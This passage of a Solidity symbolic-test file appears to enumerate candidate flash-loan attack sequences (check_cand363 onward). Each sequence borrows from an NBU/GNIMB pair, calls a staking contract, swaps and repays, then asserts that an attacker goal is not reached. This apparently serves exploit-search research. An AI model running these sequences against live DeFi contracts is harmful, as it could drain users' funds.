        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbugnimb_nbu(amt2);
        payback_pairnbugnimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand363(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand364(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbugnimb_nimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand365(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbugnimb_nimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand366(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand367(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand368(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbugnimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand369(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbugnimb_nimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand370(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbugnimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand371(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand372(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbugnimb_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand373(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand374(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand375(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand376(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand377(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand378(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand379(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbugnimb_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand380(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand381(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand382(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand383(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand384(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand385(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbugnimb_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand386(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbugnimb_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand387(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand388(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand389(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbugnimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand390(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbugnimb_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand391(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbugnimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand392(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand393(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand394(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand395(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand396(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand397(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand398(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand399(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand400(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand401(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand402(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand403(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand404(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand405(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand406(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbugnimb_nbu(amt2);
        payback_pairnbugnimb_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand407(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbugnimb_nbu(amt2);
        payback_pairnbugnimb_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand408(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbugnimb_nbu(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand409(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand410(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand411(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbugnimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand412(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbugnimb_nimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand413(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand414(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand415(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbugnimb_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand416(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbugnimb_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand417(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbugnimb_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand418(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand419(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand420(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbugnimb_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand421(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbugnimb_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand422(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
